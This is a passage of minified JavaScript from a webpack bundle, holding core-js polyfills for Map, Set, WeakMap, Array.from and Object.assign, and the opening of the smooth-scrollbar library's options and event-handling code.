i;c&&(a(i,"name")||r(i,"name",e)),t[e]!==i&&(c&&(a(i,o)||r(i,o,t[e]?""+t[e]:l.join(String(e)))),t===n?t[e]=i:s?t[e]?t[e]=i:r(t,e,i):(delete t[e],r(t,e,i)))})(Function.prototype,"toString",(function(){return"function"==typeof this&&this[o]||s.call(this)}))},function(t,e,i){var n=i(8),r=i(41),a=i(43),o=Object.defineProperty;e.f=i(4)?Object.defineProperty:function(t,e,i){if(n(t),e=a(e,!0),n(i),r)try{return o(t,e,i)}catch(t){}if("get"in i||"set"in i)throw TypeError("Accessors not supported!");return"value"in i&&(t[e]=i.value),t}},function(t,e,i){var n=i(1);t.exports=function(t){if(!n(t))throw TypeError(t+" is not an object!");return t}},function(t,e){var i={}.hasOwnProperty;t.exports=function(t,e){return i.call(t,e)}},function(t,e,i){var n=i(44);t.exports=function(t,e,i){if(n(t),void 0===e)return t;switch(i){case 1:return function(i){return t.call(e,i)};case 2:return function(i,n){return t.call(e,i,n)};case 3:return function(i,n,r){return t.call(e,i,n,r)}}return function(){return t.apply(e,arguments)}}},function(t,e,i){var n=i(7),r=i(17);t.exports=i(4)?function(t,e,i){return n.f(t,e,r(1,i))}:function(t,e,i){return t[e]=i,t}},function(t,e,i){var n=i(1);t.exports=function(t,e){if(!n(t)||t._t!==e)throw TypeError("Incompatible receiver, "+e+" required!");return t}},function(t,e){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,e){t.exports={}},function(t,e,i){var n=i(10),r=i(49),a=i(50),o=i(8),s=i(19),l=i(51),c={},h={};(e=t.exports=function(t,e,i,u,d){var p,f,m,g,v=d?function(){return t}:l(t),y=n(i,u,e?2:1),x=0;if("function"!=typeof v)throw TypeError(t+" is not iterable!");if(a(v)){for(p=s(t.length);x<p;x++)if((g=e?y(o(f=t[x])[0],f[1]):y(t[x]))===c||g===h)return g}else for(m=v.call(t);!(f=m.next()).done;)if((g=r(m,y,f.value,e))===c||g===h)return g}).BREAK=c,e.RETURN=h},function(t,e){var i=0,n=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++i+n).toString(36))}},function(t,e){t.exports=function(t,e){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:e}}},function(t,e,i){var n=i(31),r=i(28);t.exports=function(t){return n(r(t))}},function(t,e,i){var n=i(27),r=Math.min;t.exports=function(t){return 0<t?r(n(t),9007199254740991):0}},function(t,e,i){var n=i(28);t.exports=function(t){return Object(n(t))}},function(t,e,i){function n(t){s(t,r,{value:{i:"O"+ ++l,w:{}}})}var r=i(16)("meta"),a=i(1),o=i(9),s=i(7).f,l=0,c=Object.isExtensible||function(){return!0},h=!i(13)((function(){return c(Object.preventExtensions({}))})),u=t.exports={KEY:r,NEED:!1,fastKey:function(t,e){if(!a(t))return"symbol"==typeof t?t:("string"==typeof t?"S":"P")+t;if(!o(t,r)){if(!c(t))return"F";if(!e)return"E";n(t)}return t[r].i},getWeak:function(t,e){if(!o(t,r)){if(!c(t))return!0;if(!e)return!1;n(t)}return t[r].w},onFreeze:function(t){return h&&u.NEED&&c(t)&&!o(t,r)&&n(t),t}}},function(t,e,i){"use strict";var n=i(23),r={};r[i(0)("toStringTag")]="z",r+""!="[object z]"&&i(6)(Object.prototype,"toString",(function(){return"[object "+n(this)+"]"}),!0)},function(t,e,i){var n=i(24),r=i(0)("toStringTag"),a="Arguments"==n(function(){return arguments}());t.exports=function(t){var e,i,o;return void 0===t?"Undefined":null===t?"Null":"string"==typeof(i=function(t,e){try{return t[e]}catch(t){}}(e=Object(t),r))?i:a?n(e):"Object"==(o=n(e))&&"function"==typeof e.callee?"Arguments":o}},function(t,e){var i={}.toString;t.exports=function(t){return i.call(t).slice(8,-1)}},function(t,e,i){var n=i(3),r=i(2),a=r["__core-js_shared__"]||(r["__core-js_shared__"]={});(t.exports=function(t,e){return a[t]||(a[t]=void 0!==e?e:{})})("versions",[]).push({version:n.version,mode:i(40)?"pure":"global",copyright:"© 2019 Denis Pushkarev (zloirock.ru)"})},function(t,e,i){"use strict";var n=i(61)(!0);i(29)(String,"String",(function(t){this._t=String(t),this._i=0}),(function(){var t,e=this._t,i=this._i;return i>=e.length?{value:void 0,done:!0}:(t=n(e,i),this._i+=t.length,{value:t,done:!1})}))},function(t,e){var i=Math.ceil,n=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(0<t?n:i)(t)}},function(t,e){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},function(t,e,i){"use strict";function n(){return this}var r=i(40),a=i(5),o=i(6),s=i(11),l=i(14),c=i(62),h=i(33),u=i(68),d=i(0)("iterator"),p=!([].keys&&"next"in[].keys());t.exports=function(t,e,i,f,m,g,v){function y(t){if(!p&&t in T)return T[t];switch(t){case"keys":case"values":return function(){return new i(this,t)}}return function(){return new i(this,t)}}c(i,e,f);var x,b,w,_=e+" Iterator",M="values"==m,S=!1,T=t.prototype,E=T[d]||T["@@iterator"]||m&&T[m],C=E||y(m),A=m?M?y("entries"):C:void 0,L="Array"==e&&T.entries||E;if(L&&(w=u(L.call(new t)))!==Object.prototype&&w.next&&(h(w,_,!0),r||"function"==typeof w[d]||s(w,d,n)),M&&E&&"values"!==E.name&&(S=!0,C=function(){return E.call(this)}),r&&!v||!p&&!S&&T[d]||s(T,d,C),l[e]=C,l[_]=n,m)if(x={values:M?C:y("values"),keys:g?C:y("keys"),entries:A},v)for(b in x)b in T||o(T,b,x[b]);else a(a.P+a.F*(p||S),e,x);return x}},function(t,e,i){var n=i(64),r=i(46);t.exports=Object.keys||function(t){return n(t,r)}},function(t,e,i){var n=i(24);t.exports=Object("z").propertyIsEnumerable(0)?Object:function(t){return"String"==n(t)?t.split(""):Object(t)}},function(t,e,i){var n=i(25)("keys"),r=i(16);t.exports=function(t){return n[t]||(n[t]=r(t))}},function(t,e,i){var n=i(7).f,r=i(9),a=i(0)("toStringTag");t.exports=function(t,e,i){t&&!r(t=i?t:t.prototype,a)&&n(t,a,{configurable:!0,value:e})}},function(t,e,i){for(var n=i(69),r=i(30),a=i(6),o=i(2),s=i(11),l=i(14),c=i(0),h=c("iterator"),u=c("toStringTag"),d=l.Array,p={CSSRuleList:!0,CSSStyleDeclaration:!1,CSSValueList:!1,ClientRectList:!1,DOMRectList:!1,DOMStringList:!1,DOMTokenList:!0,DataTransferItemList:!1,FileList:!1,HTMLAllCollection:!1,HTMLCollection:!1,HTMLFormElement:!1,HTMLSelectElement:!1,MediaList:!0,MimeTypeArray:!1,NamedNodeMap:!1,NodeList:!0,PaintRequestList:!1,Plugin:!1,PluginArray:!1,SVGLengthList:!1,SVGNumberList:!1,SVGPathSegList:!1,SVGPointList:!1,SVGStringList:!1,SVGTransformList:!1,SourceBufferList:!1,StyleSheetList:!0,TextTrackCueList:!1,TextTrackList:!1,TouchList:!1},f=r(p),m=0;m<f.length;m++){var g,v=f[m],y=p[v],x=o[v],b=x&&x.prototype;if(b&&(b[h]||s(b,h,d),b[u]||s(b,u,v),l[v]=d,y))for(g in n)b[g]||a(b,g,n[g],!0)}},function(t,e,i){var n=i(6);t.exports=function(t,e,i){for(var r in e)n(t,r,e[r],i);return t}},function(t,e){t.exports=function(t,e,i,n){if(!(t instanceof e)||void 0!==n&&n in t)throw TypeError(i+": incorrect invocation!");return t}},function(t,e,i){"use strict";var n=i(2),r=i(5),a=i(6),o=i(35),s=i(21),l=i(15),c=i(36),h=i(1),u=i(13),d=i(52),p=i(33),f=i(73);t.exports=function(t,e,i,m,g,v){function y(t){var e=C[t];a(C,t,"delete"==t||"has"==t?function(t){return!(v&&!h(t))&&e.call(this,0===t?0:t)}:"get"==t?function(t){return v&&!h(t)?void 0:e.call(this,0===t?0:t)}:"add"==t?function(t){return e.call(this,0===t?0:t),this}:function(t,i){return e.call(this,0===t?0:t,i),this})}var x,b,w,_,M,S=n[t],T=S,E=g?"set":"add",C=T&&T.prototype,A={};return"function"==typeof T&&(v||C.forEach&&!u((function(){(new T).entries().next()})))?(b=(x=new T)[E](v?{}:-0,1)!=x,w=u((function(){x.has(1)})),_=d((function(t){new T(t)})),M=!v&&u((function(){for(var t=new T,e=5;e--;)t[E](e,e);return!t.has(-0)})),_||(((T=e((function(e,i){c(e,T,t);var n=f(new S,e,T);return null!=i&&l(i,g,n[E],n),n}))).prototype=C).constructor=T),(w||M)&&(y("delete"),y("has"),g&&y("get")),(M||b)&&y(E),v&&C.clear&&delete C.clear):(T=m.getConstructor(e,t,g,E),o(T.prototype,i),s.NEED=!0),p(T,t),A[t]=T,r(r.G+r.W+r.F*(T!=S),A),v||m.setStrong(T,t,g),T}},function(t,e,i){"use strict";var n=i(5);t.exports=function(t){n(n.S,t,{of:function(){for(var t=arguments.length,e=new Array(t);t--;)e[t]=arguments[t];return new this(e)}})}},function(t,e,i){"use strict";var n=i(5),r=i(44),a=i(10),o=i(15);t.exports=function(t){n(n.S,t,{from:function(t){var e,i,n,s,l=arguments[1];return r(this),(e=void 0!==l)&&r(l),null==t?new this:(i=[],e?(n=0,s=a(l,arguments[2],2),o(t,!1,(function(t){i.push(s(t,n++))}))):o(t,!1,i.push,i),new this(i))}})}},function(t,e){t.exports=!1},function(t,e,i){t.exports=!i(4)&&!i(13)((function(){return 7!=Object.defineProperty(i(42)("div"),"a",{get:function(){return 7}}).a}))},function(t,e,i){var n=i(1),r=i(2).document,a=n(r)&&n(r.createElement);t.exports=function(t){return a?r.createElement(t):{}}},function(t,e,i){var n=i(1);t.exports=function(t,e){if(!n(t))return t;var i,r;if(e&&"function"==typeof(i=t.toString)&&!n(r=i.call(t)))return r;if("function"==typeof(i=t.valueOf)&&!n(r=i.call(t)))return r;if(!e&&"function"==typeof(i=t.toString)&&!n(r=i.call(t)))return r;throw TypeError("Can't convert object to primitive value")}},function(t,e){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,e,i){function n(){}var r=i(8),a=i(63),o=i(46),s=i(32)("IE_PROTO"),l=function(){var t,e=i(42)("iframe"),n=o.length;for(e.style.display="none",i(67).appendChild(e),e.src="javascript:",(t=e.contentWindow.document).open(),t.write("<script>document.F=Object<\/script>"),t.close(),l=t.F;n--;)delete l.prototype[o[n]];return l()};t.exports=Object.create||function(t,e){var i;return null!==t?(n.prototype=r(t),i=new n,n.prototype=null,i[s]=t):i=l(),void 0===e?i:a(i,e)}},function(t,e){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,e){t.exports=function(t,e){return{value:e,done:!!t}}},function(t,e,i){"use strict";function n(t,e){var i,n=f(e);if("F"!==n)return t._i[n];for(i=t._f;i;i=i.n)if(i.k==e)return i}var r=i(7).f,a=i(45),o=i(35),s=i(10),l=i(36),c=i(15),h=i(29),u=i(47),d=i(72),p=i(4),f=i(21).fastKey,m=i(12),g=p?"_s":"size";t.exports={getConstructor:function(t,e,i,h){var u=t((function(t,n){l(t,u,e,"_i"),t._t=e,t._i=a(null),t._f=void 0,t._l=void 0,t[g]=0,null!=n&&c(n,i,t[h],t)}));return o(u.prototype,{clear:function(){for(var t=m(this,e),i=t._i,n=t._f;n;n=n.n)n.r=!0,n.p&&(n.p=n.p.n=void 0),delete i[n.i];t._f=t._l=void 0,t[g]=0},delete:function(t){var i,r,a=m(this,e),o=n(a,t);return o&&(i=o.n,r=o.p,delete a._i[o.i],o.r=!0,r&&(r.n=i),i&&(i.p=r),a._f==o&&(a._f=i),a._l==o&&(a._l=r),a[g]--),!!o},forEach:function(t){m(this,e);for(var i,n=s(t,1<arguments.length?arguments[1]:void 0,3);i=i?i.n:this._f;)for(n(i.v,i.k,this);i&&i.r;)i=i.p},has:function(t){return!!n(m(this,e),t)}}),p&&r(u.prototype,"size",{get:function(){return m(this,e)[g]}}),u},def:function(t,e,i){var r,a,o=n(t,e);return o?o.v=i:(t._l=o={i:a=f(e,!0),k:e,v:i,p:r=t._l,n:void 0,r:!1},t._f||(t._f=o),r&&(r.n=o),t[g]++,"F"!==a&&(t._i[a]=o)),t},getEntry:n,setStrong:function(t,e,i){h(t,e,(function(t,i){this._t=m(t,e),this._k=i,this._l=void 0}),(function(){for(var t=this._k,e=this._l;e&&e.r;)e=e.p;return this._t&&(this._l=e=e?e.n:this._t._f)?u(0,"keys"==t?e.k:"values"==t?e.v:[e.k,e.v]):(this._t=void 0,u(1))}),i?"entries":"values",!i,!0),d(e)}}},function(t,e,i){var n=i(8);t.exports=function(t,e,i,r){try{return r?e(n(i)[0],i[1]):e(i)}catch(e){var a=t.return;throw void 0!==a&&n(a.call(t)),e}}},function(t,e,i){var n=i(14),r=i(0)("iterator"),a=Array.prototype;t.exports=function(t){return void 0!==t&&(n.Array===t||a[r]===t)}},function(t,e,i){var n=i(23),r=i(0)("iterator"),a=i(14);t.exports=i(3).getIteratorMethod=function(t){if(null!=t)return t[r]||t["@@iterator"]||a[n(t)]}},function(t,e,i){var n=i(0)("iterator"),r=!1;try{var a=[7][n]();a.return=function(){r=!0},Array.from(a,(function(){throw 2}))}catch(t){}t.exports=function(t,e){if(!e&&!r)return!1;var i=!1;try{var a=[7],o=a[n]();o.next=function(){return{done:i=!0}},a[n]=function(){return o},t(a)}catch(t){}return i}},function(t,e){e.f={}.propertyIsEnumerable},function(t,e,i){var n=i(23),r=i(77);t.exports=function(t){return function(){if(n(this)!=t)throw TypeError(t+"#toJSON isn't generic");return r(this)}}},function(t,e,i){var n=i(10),r=i(31),a=i(20),o=i(19),s=i(87);t.exports=function(t,e){var i=1==t,l=2==t,c=3==t,h=4==t,u=6==t,d=5==t||u,p=e||s;return function(e,s,f){for(var m,g,v=a(e),y=r(v),x=n(s,f,3),b=o(y.length),w=0,_=i?p(e,b):l?p(e,0):void 0;w<b;w++)if((d||w in y)&&(g=x(m=y[w],w,v),t))if(i)_[w]=g;else if(g)switch(t){case 3:return!0;case 5:return m;case 6:return w;case 2:_.push(m)}else if(h)return!1;return u?-1:c||h?h:_}}},function(t,e,i){"use strict";var n=i(4),r=i(30),a=i(90),o=i(53),s=i(20),l=i(31),c=Object.assign;t.exports=!c||i(13)((function(){var t={},e={},i=Symbol(),n="abcdefghijklmnopqrst";return t[i]=7,n.split("").forEach((function(t){e[t]=t})),7!=c({},t)[i]||Object.keys(c({},e)).join("")!=n}))?function(t,e){for(var i=s(t),c=arguments.length,h=1,u=a.f,d=o.f;h<c;)for(var p,f=l(arguments[h++]),m=u?r(f).concat(u(f)):r(f),g=m.length,v=0;v<g;)p=m[v++],n&&!d.call(f,p)||(i[p]=f[p]);return i}:c},function(t,e,i){"use strict";(function(t){var i="object"==typeof t&&t&&t.Object===Object&&t;e.a=i}).call(this,i(99))},function(t,e,i){t.exports=i(100)},function(t,e,i){i(22),i(26),i(34),i(71),i(76),i(78),i(79),t.exports=i(3).Map},function(t,e,i){t.exports=i(25)("native-function-to-string",Function.toString)},function(t,e,i){var n=i(27),r=i(28);t.exports=function(t){return function(e,i){var a,o,s=String(r(e)),l=n(i),c=s.length;return l<0||c<=l?t?"":void 0:(a=s.charCodeAt(l))<55296||56319<a||l+1===c||(o=s.charCodeAt(l+1))<56320||57343<o?t?s.charAt(l):a:t?s.slice(l,l+2):o-56320+(a-55296<<10)+65536}}},function(t,e,i){"use strict";var n=i(45),r=i(17),a=i(33),o={};i(11)(o,i(0)("iterator"),(function(){return this})),t.exports=function(t,e,i){t.prototype=n(o,{next:r(1,i)}),a(t,e+" Iterator")}},function(t,e,i){var n=i(7),r=i(8),a=i(30);t.exports=i(4)?Object.defineProperties:function(t,e){r(t);for(var i,o=a(e),s=o.length,l=0;l<s;)n.f(t,i=o[l++],e[i]);return t}},function(t,e,i){var n=i(9),r=i(18),a=i(65)(!1),o=i(32)("IE_PROTO");t.exports=function(t,e){var i,s=r(t),l=0,c=[];for(i in s)i!=o&&n(s,i)&&c.push(i);for(;e.length>l;)n(s,i=e[l++])&&(~a(c,i)||c.push(i));return c}},function(t,e,i){var n=i(18),r=i(19),a=i(66);t.exports=function(t){return function(e,i,o){var s,l=n(e),c=r(l.length),h=a(o,c);if(t&&i!=i){for(;h<c;)if((s=l[h++])!=s)return!0}else for(;h<c;h++)if((t||h in l)&&l[h]===i)return t||h||0;return!t&&-1}}},function(t,e,i){var n=i(27),r=Math.max,a=Math.min;t.exports=function(t,e){return(t=n(t))<0?r(t+e,0):a(t,e)}},function(t,e,i){var n=i(2).document;t.exports=n&&n.documentElement},function(t,e,i){var n=i(9),r=i(20),a=i(32)("IE_PROTO"),o=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=r(t),n(t,a)?t[a]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?o:null}},function(t,e,i){"use strict";var n=i(70),r=i(47),a=i(14),o=i(18);t.exports=i(29)(Array,"Array",(function(t,e){this._t=o(t),this._i=0,this._k=e}),(function(){var t=this._t,e=this._k,i=this._i++;return!t||i>=t.length?(this._t=void 0,r(1)):r(0,"keys"==e?i:"values"==e?t[i]:[i,t[i]])}),"values"),a.Arguments=a.Array,n("keys"),n("values"),n("entries")},function(t,e,i){var n=i(0)("unscopables"),r=Array.prototype;null==r[n]&&i(11)(r,n,{}),t.exports=function(t){r[n][t]=!0}},function(t,e,i){"use strict";var n=i(48),r=i(12);t.exports=i(37)("Map",(function(t){return function(){return t(this,0<arguments.length?arguments[0]:void 0)}}),{get:function(t){var e=n.getEntry(r(this,"Map"),t);return e&&e.v},set:function(t,e){return n.def(r(this,"Map"),0===t?0:t,e)}},n,!0)},function(t,e,i){"use strict";var n=i(2),r=i(7),a=i(4),o=i(0)("species");t.exports=function(t){var e=n[t];a&&e&&!e[o]&&r.f(e,o,{configurable:!0,get:function(){return this}})}},function(t,e,i){var n=i(1),r=i(74).set;t.exports=function(t,e,i){var a,o=e.constructor;return o!==i&&"function"==typeof o&&(a=o.prototype)!==i.prototype&&n(a)&&r&&r(t,a),t}},function(t,e,i){function n(t,e){if(a(t),!r(e)&&null!==e)throw TypeError(e+": can't set as prototype!")}var r=i(1),a=i(8);t.exports={set:Object.setPrototypeOf||("__proto__"in{}?function(t,e,r){try{(r=i(10)(Function.call,i(75).f(Object.prototype,"__proto__").set,2))(t,[]),e=!(t instanceof Array)}catch(t){e=!0}return function(t,i){return n(t,i),e?t.__proto__=i:r(t,i),t}}({},!1):void 0),check:n}},function(t,e,i){var n=i(53),r=i(17),a=i(18),o=i(43),s=i(9),l=i(41),c=Object.getOwnPropertyDescriptor;e.f=i(4)?c:function(t,e){if(t=a(t),e=o(e,!0),l)try{return c(t,e)}catch(t){}if(s(t,e))return r(!n.f.call(t,e),t[e])}},function(t,e,i){var n=i(5);n(n.P+n.R,"Map",{toJSON:i(54)("Map")})},function(t,e,i){var n=i(15);t.exports=function(t,e){var i=[];return n(t,!1,i.push,i,e),i}},function(t,e,i){i(38)("Map")},function(t,e,i){i(39)("Map")},function(t,e,i){i(22),i(26),i(34),i(81),i(82),i(83),i(84),t.exports=i(3).Set},function(t,e,i){"use strict";var n=i(48),r=i(12);t.exports=i(37)("Set",(function(t){return function(){return t(this,0<arguments.length?arguments[0]:void 0)}}),{add:function(t){return n.def(r(this,"Set"),t=0===t?0:t,t)}},n)},function(t,e,i){var n=i(5);n(n.P+n.R,"Set",{toJSON:i(54)("Set")})},function(t,e,i){i(38)("Set")},function(t,e,i){i(39)("Set")},function(t,e,i){i(22),i(34),i(86),i(92),i(93),t.exports=i(3).WeakMap},function(t,e,i){"use strict";function n(t){return function(){return t(this,0<arguments.length?arguments[0]:void 0)}}var r,a=i(2),o=i(55)(0),s=i(6),l=i(21),c=i(56),h=i(91),u=i(1),d=i(12),p=i(12),f=!a.ActiveXObject&&"ActiveXObject"in a,m=l.getWeak,g=Object.isExtensible,v=h.ufstore,y={get:function(t){if(u(t)){var e=m(t);return!0===e?v(d(this,"WeakMap")).get(t):e?e[this._i]:void 0}},set:function(t,e){return h.def(d(this,"WeakMap"),t,e)}},x=t.exports=i(37)("WeakMap",n,y,h,!0,!0);p&&f&&(c((r=h.getConstructor(n,"WeakMap")).prototype,y),l.NEED=!0,o(["delete","has","get","set"],(function(t){var e=x.prototype,i=e[t];s(e,t,(function(e,n){if(!u(e)||g(e))return i.call(this,e,n);this._f||(this._f=new r);var a=this._f[t](e,n);return"set"==t?this:a}))})))},function(t,e,i){var n=i(88);t.exports=function(t,e){return new(n(t))(e)}},function(t,e,i){var n=i(1),r=i(89),a=i(0)("species");t.exports=function(t){var e;return r(t)&&("function"!=typeof(e=t.constructor)||e!==Array&&!r(e.prototype)||(e=void 0),n(e)&&null===(e=e[a])&&(e=void 0)),void 0===e?Array:e}},function(t,e,i){var n=i(24);t.exports=Array.isArray||function(t){return"Array"==n(t)}},function(t,e){e.f=Object.getOwnPropertySymbols},function(t,e,i){"use strict";function n(t){return t._l||(t._l=new v)}function r(t,e){return f(t.a,(function(t){return t[0]===e}))}var a=i(35),o=i(21).getWeak,s=i(8),l=i(1),c=i(36),h=i(15),u=i(55),d=i(9),p=i(12),f=u(5),m=u(6),g=0,v=function(){this.a=[]};v.prototype={get:function(t){var e=r(this,t);if(e)return e[1]},has:function(t){return!!r(this,t)},set:function(t,e){var i=r(this,t);i?i[1]=e:this.a.push([t,e])},delete:function(t){var e=m(this.a,(function(e){return e[0]===t}));return~e&&this.a.splice(e,1),!!~e}},t.exports={getConstructor:function(t,e,i,r){var s=t((function(t,n){c(t,s,e,"_i"),t._t=e,t._i=g++,t._l=void 0,null!=n&&h(n,i,t[r],t)}));return a(s.prototype,{delete:function(t){if(!l(t))return!1;var i=o(t);return!0===i?n(p(this,e)).delete(t):i&&d(i,this._i)&&delete i[this._i]},has:function(t){if(!l(t))return!1;var i=o(t);return!0===i?n(p(this,e)).has(t):i&&d(i,this._i)}}),s},def:function(t,e,i){var r=o(s(e),!0);return!0===r?n(t).set(e,i):r[t._i]=i,t},ufstore:n}},function(t,e,i){i(38)("WeakMap")},function(t,e,i){i(39)("WeakMap")},function(t,e,i){i(26),i(95),t.exports=i(3).Array.from},function(t,e,i){"use strict";var n=i(10),r=i(5),a=i(20),o=i(49),s=i(50),l=i(19),c=i(96),h=i(51);r(r.S+r.F*!i(52)((function(t){Array.from(t)})),"Array",{from:function(t){var e,i,r,u,d=a(t),p="function"==typeof this?this:Array,f=arguments.length,m=1<f?arguments[1]:void 0,g=void 0!==m,v=0,y=h(d);if(g&&(m=n(m,2<f?arguments[2]:void 0,2)),null==y||p==Array&&s(y))for(i=new p(e=l(d.length));v<e;v++)c(i,v,g?m(d[v],v):d[v]);else for(u=y.call(d),i=new p;!(r=u.next()).done;v++)c(i,v,g?o(u,m,[r.value,v],!0):r.value);return i.length=v,i}})},function(t,e,i){"use strict";var n=i(7),r=i(17);t.exports=function(t,e,i){e in t?n.f(t,e,r(0,i)):t[e]=i}},function(t,e,i){i(98),t.exports=i(3).Object.assign},function(t,e,i){var n=i(5);n(n.S+n.F,"Object",{assign:i(56)})},function(t,e){var i=function(){return this}();try{i=i||new Function("return this")()}catch(t){"object"==typeof window&&(i=window)}t.exports=i},function(t,e,i){"use strict";i.r(e);var n={};i.r(n),i.d(n,"keyboardHandler",(function(){return ut})),i.d(n,"mouseHandler",(function(){return dt})),i.d(n,"resizeHandler",(function(){return pt})),i.d(n,"selectHandler",(function(){return ft})),i.d(n,"touchHandler",(function(){return mt})),i.d(n,"wheelHandler",(function(){return gt}));var r=function(t,e){return(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)},a=function(){return(a=Object.assign||function(t){for(var e,i=1,n=arguments.length;i<n;i++)for(var r in e=arguments[i])Object.prototype.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t}).apply(this,arguments)};function o(t,e,i,n){var r,a=arguments.length,o=a<3?e:null===n?n=Object.getOwnPropertyDescriptor(e,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)o=Reflect.decorate(t,e,i,n);else for(var s=t.length-1;0<=s;s--)(r=t[s])&&(o=(a<3?r(o):3<a?r(e,i,o):r(e,i))||o);return 3<a&&o&&Object.defineProperty(e,i,o),o}function s(t){var e=typeof t;return null!=t&&("object"==e||"function"==e)}function l(t){if("number"==typeof t)return t;if("symbol"==typeof(e=t)||null!=e&&"object"==typeof e&&"[object Symbol]"==(null==(i=e)?void 0===i?"[object Undefined]":"[object Null]":y&&y in Object(i)?function(t){var e=f.call(t,g),i=t[g];try{var n=!(t[g]=void 0)}catch(t){}var r=m.call(t);return n&&(e?t[g]=i:delete t[g]),r}(i):v.call(i)))return NaN;var e,i,n;if(s(t)&&(n="function"==typeof t.valueOf?t.valueOf():t,t=s(n)?n+"":n),"string"!=typeof t)return 0===t?t:+t;t=t.replace(x,"");var r=w.test(t);return r||_.test(t)?M(t.slice(2),r?2:8):b.test(t)?NaN:+t}i(59),i(80),i(85),i(94),i(97);var c=i(57),h="object"==typeof self&&self&&self.Object===Object&&self,u=c.a||h||Function("return this")(),d=u.Symbol,p=Object.prototype,f=p.hasOwnProperty,m=p.toString,g=d?d.toStringTag:void 0,v=Object.prototype.toString,y=d?d.toStringTag:void 0,x=/^\s+|\s+$/g,b=/^[-+]0x[0-9a-f]+$/i,w=/^0b[01]+$/i,_=/^0o[0-7]+$/i,M=parseInt,S=function(t,e,i){return void 0===i&&(i=e,e=void 0),void 0!==i&&(i=(i=l(i))==i?i:0),void 0!==e&&(e=(e=l(e))==e?e:0),(n=l(t))==n&&(void 0!==i&&(n=n<=i?n:i),void 0!==e&&(n=e<=n?n:e)),n;var n};function T(t,e){return void 0===t&&(t=-1/0),void 0===e&&(e=1/0),function(i,n){var r="_"+n;Object.defineProperty(i,n,{get:function(){return this[r]},set:function(i){Object.defineProperty(this,r,{value:S(i,t,e),enumerable:!1,writable:!0,configurable:!0})},enumerable:!0,configurable:!0})}}function E(t,e){var i="_"+e;Object.defineProperty(t,e,{get:function(){return this[i]},set:function(t){Object.defineProperty(this,i,{value:!!t,enumerable:!1,writable:!0,configurable:!0})},enumerable:!0,configurable:!0})}function C(){return u.Date.now()}var A=Math.max,L=Math.min,P=function(t,e,i){var n,r,a,o,c,h,u=0,d=!1,p=!1,f=!0;if("function"!=typeof t)throw new TypeError("Expected a function");function m(e){var i=n,a=r;return n=r=void 0,u=e,o=t.apply(a,i)}function g(t){var i=t-h;return void 0===h||e<=i||i<0||p&&a<=t-u}function v(){var t,i=C();if(g(i))return y(i);c=setTimeout(v,(t=e-(i-h),p?L(t,a-(i-u)):t))}function y(t){return c=void 0,f&&n?m(t):(n=r=void 0,o)}function x(){var t,i=C(),a=g(i);if(n=arguments,r=this,h=i,a){if(void 0===c)return u=t=h,c=setTimeout(v,e),d?m(t):o;if(p)return clearTimeout(c),c=setTimeout(v,e),m(h)}return void 0===c&&(c=setTimeout(v,e)),o}return e=l(e)||0,s(i)&&(d=!!i.leading,a=(p="maxWait"in i)?A(l(i.maxWait)||0,e):a,f="trailing"in i?!!i.trailing:f),x.cancel=function(){void 0!==c&&clearTimeout(c),n=h=r=c=void(u=0)},x.flush=function(){return void 0===c?o:y(C())},x};function R(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return function(e,i,n){var r=n.value;return{get:function(){return this.hasOwnProperty(i)||Object.defineProperty(this,i,{value:P.apply(void 0,function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var n=Array(t),r=0;for(e=0;e<i;e++)for(var a=arguments[e],o=0,s=a.length;o<s;o++,r++)n[r]=a[o];return n}([r],t))}),this[i]}}}}var O,I=(Object.defineProperty(D.prototype,"wheelEventTarget",{get:function(){return this.delegateTo},set:function(t){console.warn("[smooth-scrollbar]: `options.wheelEventTarget` is deprecated and will be removed in the future, use `options.delegateTo` instead."),this.delegateTo=t},enumerable:!0,configurable:!0}),o([T(0,1)],D.prototype,"damping",void 0),o([T(0,1/0)],D.prototype,"thumbMinSize",void 0),o([E],D.prototype,"renderByPixels",void 0),o([E],D.prototype,"alwaysShowTracks",void 0),o([E],D.prototype,"continuousScrolling",void 0),D),z=new WeakMap;function D(t){var e=this;void 0===t&&(t={}),this.damping=.1,this.thumbMinSize=20,this.renderByPixels=!0,this.alwaysShowTracks=!1,this.continuousScrolling=!0,this.delegateTo=null,this.plugins={},Object.keys(t).forEach((function(i){e[i]=t[i]}))}function N(){if(void 0!==O)return O;var t=!1;try{var e=function(){},i=Object.defineProperty({},"passive",{get:function(){t=!0}});window.addEventListener("testPassive",e,i),window.removeEventListener("testPassive",e,i)}catch(t){}return O=!!t&&{passive:!1}}function k(t){var e=z.get(t)||[];return z.set(t,e),function(t,i,n){function r(t){t.defaultPrevented||n(t)}i.split(/\s+/g).forEach((function(i){e.push({elem:t,eventName:i,handler:r}),t.addEventListener(i,r,N())}))}}function B(t){var e=t.touches?t.touches[t.touches.length-1]:t;return{x:e.clientX,y:e.clientY}}function F(t,e){return void 0===e&&(e=[]),e.some((function(e){return t===e}))}var H=["webkit","moz","ms","o"],G=new RegExp("^-(?!(?:"+H.join("|")+")-)");function j(t,e){var i,n;i=e,n={},Object.keys(i).forEach((function(t){var e;G.test(t)?(e=i[t],t=t.replace(/^-/,""),n[t]=e,H.forEach((function(i){n["-"+i+"-"+t]=e}))):n[t]=i[t]})),e=n,Object.keys(e).forEach((function(i){var n=i.replace(/^-/,"").replace(/-([a-z])/g,(function(t,e){return e.toUpperCase()}));t.style[n]=e[i]}))}var U,V,W=(Y.prototype.update=function(t){var 